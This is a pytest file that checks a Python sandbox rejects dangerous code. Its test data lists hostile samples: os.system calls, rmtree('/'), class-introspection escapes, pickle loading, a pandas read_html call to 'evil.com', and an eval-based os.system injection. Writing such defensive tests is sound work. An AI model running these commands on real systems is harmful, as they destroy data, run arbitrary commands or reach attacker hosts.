import pytest
from app.tools.python_sandbox import PythonSandboxRunner, validate_python_code

def test_sandbox_safe_math_calculation():
    code = """
import math
import statistics

values = INPUT_DATA.get("metrics", [10, 20, 30, 40, 50])
mean_val = statistics.mean(values)
variance = statistics.variance(values)
return {"mean": mean_val, "variance": variance}
"""
    res = PythonSandboxRunner.execute(code, input_data={"metrics": [10, 20, 30, 40, 50]})
    assert res.success is True
    assert res.computed_output["mean"] == 30
    assert res.computed_output["variance"] == 250
    assert res.reproducibility_hash is not None

def test_sandbox_rejection_of_dangerous_imports():
    malicious_scripts = [
        "import os\nos.system('whoami')",
        "import sys\nreturn sys.modules",
        "import subprocess\nsubprocess.run(['dir'])",
        "import socket\ns = socket.socket()",
        "from shutil import rmtree\nrmtree('/')",
    ]
    for script in malicious_scripts:
        res = PythonSandboxRunner.execute(script)
        assert res.success is False
        assert "unauthorized module" in res.error_message.lower() or "security validation failed" in res.error_message.lower()

def test_sandbox_rejection_of_introspection():
    introspection_scripts = [
        "return ().__class__.__bases__[0].__subclasses__()",
        "x = [].__class__; return x",
        "eval('1 + 1')",
        "exec('a = 5')",
        "open('config.py', 'r')",
        "x = object.__new__(dict)",
        "x = getattr(math, 'sin')",
        "x = ().__getattribute__('__doc__')",
    ]
    for script in introspection_scripts:
        res = PythonSandboxRunner.execute(script)
        assert res.success is False
        assert "prohibited" in res.error_message.lower() or "restricted" in res.error_message.lower() or "blocked" in res.error_message.lower()

def test_sandbox_rejection_of_pandas_and_numpy_escapes():
    escapes = [
        "import pandas as pd\ndf = pd.read_csv('/tmp/secrets.csv')",
        "import pandas as pd\ndf = pd.read_excel('budget.xlsx')",
        "import pandas as pd\ndf = pd.read_feather('data.feather')",
        "import pandas as pd\ndf = pd.read_parquet('data.parquet')",
        "import pandas as pd\ndf = pd.read_pickle('exploit.pkl')",
        "import pandas as pd\ndf = pd.read_json('data.json')",
        "import pandas as pd\ndf = pd.read_html('http://evil.com')",
        "import pandas as pd\ndf = pd.DataFrame(); df.to_pickle('/tmp/evil.pkl')",
        "import pandas as pd\ndf = pd.DataFrame(); df.to_csv('/tmp/evil.csv')",
        "import pandas as pd\ndf = pd.DataFrame(); df.eval('__import__(\"os\").system(\"id\")')",
        "import numpy as np\narr = np.load('exploit.npy')",
        "import numpy as np\narr = np.save('exploit.npy', [1, 2])",
        "import numpy as np\narr = np.fromfile('secrets.bin')",
        "import numpy as np\narr = np.memmap('secrets.bin')",
    ]
    for script in escapes:
        res = PythonSandboxRunner.execute(script)
        assert res.success is False
        assert "prohibited" in res.error_message.lower() or "blocked" in res.error_message.lower()

def test_sandbox_timeout_enforcement():
    infinite_loop = """
import time
while True:
    time.sleep(0.1)
"""
    # Enforce 1-second timeout
    res = PythonSandboxRunner.execute(infinite_loop, timeout_seconds=1)
    assert res.success is False
    assert "timed out" in res.error_message.lower()
